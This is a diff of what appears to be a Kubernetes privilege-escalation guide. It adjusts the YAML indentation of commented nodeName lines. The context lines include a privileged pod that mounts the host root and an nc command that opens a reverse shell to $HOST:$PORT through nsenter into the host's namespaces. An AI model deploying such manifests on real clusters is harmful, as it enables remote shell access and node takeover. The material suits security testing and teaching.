@@ -24,7 +24,7 @@ spec:
     tty: true
     securityContext:
       privileged: true
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
   ```
 [pod-priv-and-hostpid.yaml](pod-priv-and-hostpid.yaml)
 
@@ -68,7 +68,8 @@ spec:
     - mountPath: /host
       name: noderoot
     command: [ "/bin/nc", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  volumes:
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
+  volumes:
   - name: noderoot
     hostPath:
       path: /
